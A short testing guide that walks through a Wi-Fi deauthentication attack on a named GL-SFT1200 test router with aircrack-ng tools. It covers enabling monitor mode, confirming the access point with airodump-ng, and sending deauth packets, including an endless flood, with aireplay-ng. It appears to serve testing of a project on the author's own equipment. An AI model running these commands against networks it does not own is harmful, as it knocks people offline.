# Testing Guide

Test router:

```
SSID:    GL-SFT1200-d52
BSSID:   94:83:C4:62:1D:54
Channel: 1
```

Note that the channel might change. Update the channel number accordingly if it does.

## Setup

### 1. Enable monitor mode

Check your adapter name. In my HP Envy with Arch Linux, it's called `wlan0`.

```bash
ip link
```

Then, kill all the conflicting processes and put `wlan0` into monitor mode.

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0 1
```

After it's in monitor mode, the adapter will usually be renamed to `wlan0mon`.

### 2. Confirm the target AP

Confirm the target AP is still turned on, and is in the correct channel. 
Run the `scan` command on the arduino to verify the channel number for this AP.
Replace the number if it has changed.
However, this step is optional.

```bash
sudo airodump-ng --bssid 94:83:C4:62:1D:54 -c 1 wlan0mon
```

You should be able to see the SSID, BSSID and PWR (RSSI).

### 3. Perform attack

Send 10 detauth packets to this BSSID.
Replace the `10` with a `0` to keep on sending an infinite number of deauth packets until a keyboard interrupt. 

```bash
sudo aireplay-ng --deauth 10 -a 94:83:C4:62:1D:54 wlan0mon
```


### 4. Revert changes after testing

Put the adapter back to `managed` mode and restart NetworkManager (which will killed before).

```bash
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

If you use `iwd` instead of NetworkManager:

```bash
sudo systemctl restart iwd
```
